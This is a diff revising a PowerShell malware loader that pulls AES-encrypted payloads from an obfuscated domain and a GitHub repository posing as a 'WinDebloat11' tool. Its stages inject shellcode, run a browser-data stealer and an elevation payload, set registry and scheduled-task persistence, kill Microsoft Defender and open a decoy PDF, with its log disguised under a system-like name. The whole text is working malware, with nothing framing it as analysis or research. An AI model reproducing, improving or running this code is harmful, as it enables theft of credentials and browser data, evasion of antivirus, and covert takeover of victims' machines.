@@ -1,6 +1,5 @@
 $ProgressPreference='SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
-[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 
 # === CONFIG: Payload mode ===
 # 'raw' = AES-encrypted raw EXE (shellcode injection)
@@ -13,8 +12,6 @@ $keys=@{
     # RAW EXE → AES
     'raw/patch.exe.aes'              = '3k84C21qJDZQ+sG4Uk7Iyb+29hCgXSP6isHUZb/nb+I8qbd8aqE1eB2qYUZ2BoCM'
     'raw/update.exe.aes'             = 'hnwCGrp/haHk1saCAuy/1T08cAkllwiSPs3Yapgaqu+bmqDA9hGHoH/yfaWuMbwv'
-    # Donut shellcode → AES
-    'raw/patch.bin.aes'              = 'gjkDUSk/nqYag8tuOpBGN3T+neGnEXJ5E7zatOzM+jUQUbPt+t3eFtewmMNnw9yS'
     'raw/ElevatorShellCode.exe.aes'  = '8XuttOXcFiQT+aOlVxneccVpq3mAugc5b7D3caLIVkbiFegb1/cCA2RAyIhtQult'
     'raw/hack-browser-data.exe.aes'  = '8zJ8w9Q7Y04ZaqwZ7LeQT2C6Tw6kSPD2P1nDCFbknRWwVDwzo9hx5D186PdFdjey'
     # Donut+SGN → AES
@@ -40,9 +37,8 @@ $keys=@{
 # === MULTI-SOURCE ===
 $c1='ht';$c2='tps';$c3='://s';$c4='igni';$c5='ndat';$c6='.com'
 $srv=$c1+$c2+$c3+$c4+$c5+$c6
-$ip='https://193.26.115.196'
 $gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers'
-$sources=@($ip, $gh)
+$sources=@($gh, $srv)
 
 # === LOGGING ===
 $logPath="$env:TEMP\wmisrv.log"
@@ -259,7 +255,7 @@ function _dl($remoteName) {
 
 # === DOWNLOAD + RUN .EXE DIRECTLY (no AES) ===
 function _dlExe($remoteName, $stage, $label) {
-    $fullName=$remoteName
+    $fullName="raw/$remoteName"
     $exeBytes=_dl $fullName
     if (-not $exeBytes) {
         _cb $stage 'fail' "$label download failed"
@@ -299,7 +295,7 @@ function _runAes($remoteName, $stage, $label) {
     
     _log "$stage : $fullName decrypted: $($shellcode.Length) bytes"
     
-    $result=_scInject $shellcode
+    $result=_scInjectSafe $shellcode $label
     if ($result) {
         _cb $stage 'ok' "$label executed ($($shellcode.Length) bytes)"
     } else {
@@ -408,14 +404,14 @@ try {
 
 _cb 'S3' 'ok' 'persistence set (reg+task)'
 
-# === S2: Defender killer (update.exe — BEFORE payload, prevents detection) ===
+# === S2: Defender killer (update.exe — direct download, no AES) ===
 if ($cbIsAdmin) {
     _dlExe 'update.exe' 'S2' 'DefenderKiller'
-    Start-Sleep 3
+    Start-Sleep 2
 }
 
-# === S5: patch.exe (direct .exe — .NET app, connects to C2 itself) ===
-_dlExe 'patch.exe' 'S5' 'patch.exe'
+# === S5: patch.exe (AES blob → shellcode inject) ===
+_runAes 'patch.exe.aes' 'S5' 'patch.exe'
 
 # === S7: Decoy PDF ===
 $pdf1='Rate';$pdf2='_Confirmation';$pdf3='_LD-2026-0847';$pdf4='.pdf'
